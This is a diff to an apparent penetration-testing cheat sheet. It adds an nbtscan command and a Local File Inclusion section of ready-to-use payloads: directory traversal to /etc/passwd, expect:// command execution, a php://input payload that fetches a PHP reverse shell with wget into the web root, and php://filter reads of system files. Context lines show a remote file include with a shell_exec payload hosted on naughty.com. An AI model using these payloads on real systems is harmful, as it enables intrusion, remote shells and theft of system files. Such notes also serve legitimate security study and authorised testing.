@@ -46,6 +46,8 @@
     -```smbclient \\\\ip\\share```
    - try to connect to them to see if they are truly alive
    - Banner grabbing even if booted
+   - ```nbtscan [ip-range]``` (https://highon.coffee/blog/nbtscan-cheat-sheet/)
+   
 - Port 22
   - Banner grabbing
     -```ssh root@192.192.192.192```
@@ -95,6 +97,23 @@
       - http://192.192.192.192/index.php?page=http://naughty.com/badfile.txt
     - Badfile.txt:
       - ```<?php echo shell_exec("whoami");?>```
+
+- LFI (https://highon.coffee/blog/lfi-cheat-sheet/)
+  - Directory traversal
+    - ```foo.php?file=../../../../../../../etc/passwd```
+  - PHP ```expect:``` #Not enabled by default, uses expect wrapper to execute commands
+    - http://127.0.0.1/fileincl/example1.php?page=expect://ls
+  - PHP (POST request) ```php://input```
+    - http://192.168.183.128/fileincl/example1.php?page= **php://input**
+      - input can be: ```<? system('wget http://192.192.192.192/php-reverse-shell.php -O /var/www/shell.php');?>
+      - In browser: http://192.192.192.192/shell.php
+  - PHP ```php://filter```
+    - http://192.192.192.192/fileincl/example1.php?page=**php://filter/convert.base64-encode/resource=../../../../../etc/passwd**
+    - Must decode the output from base64
+  - /proc/self/environ (If you able to write there)
+    - Manipulate ```User Agent``` in Burp
+  - https://highon.coffee/blog/lfi-cheat-sheet/#fimap--phpinfo-exploit
+    - Uses phpinfo() to write temporary files together with fimap
       
 - WAF
   wafw00f http://example.com
